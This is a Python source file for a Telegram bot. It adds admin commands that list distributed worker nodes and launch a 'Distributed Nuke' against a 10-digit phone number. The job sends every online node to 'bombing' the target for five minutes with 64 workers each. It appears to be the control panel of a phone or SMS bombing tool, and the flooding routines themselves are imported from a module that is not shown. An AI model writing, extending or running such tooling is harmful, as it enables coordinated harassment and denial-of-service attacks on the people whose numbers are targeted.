from __future__ import annotations

from aiogram import Router, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder

from bot.config import ADMIN_ID
from bot.services.database import db
from bot.utils import PM, b, i, c, hEsc

router = Router()


def isAdmin(userId: int) -> bool:
    return userId == ADMIN_ID


class DistStates(StatesGroup):
    waitingPhone = State()


@router.message(Command("nodes"))
async def cmdNodes(message: Message) -> None:
    if not isAdmin(message.from_user.id):
        return
    try:
        from distributed import getActiveNodes, NODE_ID
        nodes = getActiveNodes(db)
        if not nodes:
            await message.answer(
                f"{b('Distributed Nodes')}\n\n{i('No nodes online. Set NODE_ID env var on each Railway instance.')}",
                parse_mode=PM
            )
            return
        lines = [f"{b('Active Nodes')}  {c(str(len(nodes)) + ' online')}\n"]
        for n in nodes:
            tag = " (this)" if n == NODE_ID else ""
            lines.append(f"  {c(n)}{tag}")
        builder = InlineKeyboardBuilder()
        builder.button(text="Distributed Nuke", callback_data="dist:nuke")
        await message.answer("\n".join(lines), reply_markup=builder.as_markup(), parse_mode=PM)
    except Exception as e:
        await message.answer(f"Distributed system not initialized.\n\n{str(e)[:100]}")


@router.callback_query(F.data == "dist:nuke")
async def cbDistNuke(callback: CallbackQuery, state: FSMContext) -> None:
    if not isAdmin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return
    await state.set_state(DistStates.waitingPhone)
    builder = InlineKeyboardBuilder()
    builder.button(text="Cancel", callback_data="adm:menu")
    await callback.message.edit_text(
        f"{b('Distributed Nuke')}\n\n"
        f"Enter the target number.\n\n"
        f"{i('All online Railway instances will fire simultaneously.')}\n"
        f"{i('Combined power of every node at once.')}",
        reply_markup=builder.as_markup(),
        parse_mode=PM
    )
    await callback.answer()


@router.message(StateFilter(DistStates.waitingPhone))
async def handleDistPhone(message: Message, state: FSMContext) -> None:
    if not isAdmin(message.from_user.id):
        return
    phone = (message.text or "").strip()
    if not phone.isdigit() or len(phone) != 10:
        await message.answer("Enter exactly 10 digits.")
        return
    await state.clear()

    try:
        from distributed import dispatchJob, getActiveNodes, NODE_ID
        nodes = getActiveNodes(db)

        # Dispatch job to all worker nodes via DB
        jobId = dispatchJob(db, phone=phone, duration=300, workers=64, nukeMode=True)

        builder = InlineKeyboardBuilder()
        builder.button(text="Admin Menu", callback_data="adm:menu")

        await message.answer(
            f"{b('Distributed Nuke Dispatched')}\n\n"
            f"Target    {c(phone)}\n"
            f"Nodes     {c(str(len(nodes)))}\n"
            f"Job ID    {c(jobId)}\n"
            f"Duration  {c('5 minutes')}\n"
            f"Mode      {c('NUKE — MAX POWER')}\n\n"
            f"{i('All worker nodes are now bombing simultaneously.')}",
            reply_markup=builder.as_markup(),
            parse_mode=PM
        )
    except Exception as e:
        await message.answer(f"Error: {str(e)[:100]}")